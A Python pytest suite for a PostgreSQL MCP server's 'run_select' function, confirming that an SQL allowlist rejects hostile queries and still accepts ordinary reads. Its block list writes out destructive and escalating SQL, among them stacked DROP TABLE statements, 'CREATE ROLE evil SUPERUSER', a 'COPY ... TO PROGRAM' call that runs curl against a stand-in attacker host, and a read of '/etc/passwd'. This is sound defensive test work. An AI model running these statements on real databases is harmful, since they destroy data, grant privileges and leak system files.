"""Adversarial SQL-safety regression suite for ``run_select``.

The reference PostgreSQL MCP server was retired after a SQL-injection
vulnerability. ``run_select`` runs every query through the vendored
``SafeSqlDriver`` allowlist; this suite locks in that dangerous input is
rejected *before* it ever reaches the database driver, and that legitimate
read queries still pass.
"""

import pytest
from _fakes import FakeDriver

from mcpg.query import QueryError, run_select

# Each entry is a hostile query that must be rejected. The labels name the
# attack class so a regression points straight at what broke.
_BLOCKED: dict[str, str] = {
    "stacked-drop": "SELECT 1; DROP TABLE users",
    "stacked-delete": "SELECT 1; DELETE FROM users",
    "line-comment-escape": "SELECT 1 -- harmless\n; DROP TABLE users",
    "block-comment-stack": "SELECT 1 /* comment */; TRUNCATE users",
    "insert": "INSERT INTO users (id) VALUES (1)",
    "update": "UPDATE users SET is_admin = true",
    "delete": "DELETE FROM users",
    "drop-table": "DROP TABLE users",
    "create-table": "CREATE TABLE evil (id int)",
    "alter-table": "ALTER TABLE users ADD COLUMN evil text",
    "truncate": "TRUNCATE users",
    "grant": "GRANT ALL ON users TO PUBLIC",
    "create-role": "CREATE ROLE evil SUPERUSER",
    "commit-escape": "COMMIT",
    "rollback-escape": "ROLLBACK",
    "begin-escape": "BEGIN",
    "copy-to-program": "COPY users TO PROGRAM 'curl https://evil.example'",
    "copy-from-file": "COPY users FROM '/etc/passwd'",
    "do-block": "DO $$ BEGIN PERFORM 1; END $$",
    "explain-analyze": "EXPLAIN ANALYZE SELECT 1",
    "unparseable": "this is not valid sql",
}

# Legitimate read queries that must continue to be accepted.
_ALLOWED: list[str] = [
    "SELECT 1",
    "SELECT * FROM users WHERE id = 5",
    "SELECT u.id FROM users u JOIN orders o ON o.user_id = u.id",
    "WITH recent AS (SELECT id FROM orders) SELECT * FROM recent",
    "SELECT count(*) FROM users",
]


@pytest.mark.parametrize("attack", _BLOCKED.values(), ids=list(_BLOCKED))
async def test_run_select_rejects_hostile_sql(attack: str) -> None:
    driver = FakeDriver()

    with pytest.raises(QueryError):
        await run_select(driver, attack)

    # Rejection must happen at validation: the driver is never touched.
    assert driver.calls == []


@pytest.mark.parametrize("query", _ALLOWED)
async def test_run_select_accepts_legitimate_read_queries(query: str) -> None:
    # No QueryError: the query passes validation and reaches the driver.
    await run_select(FakeDriver(), query)
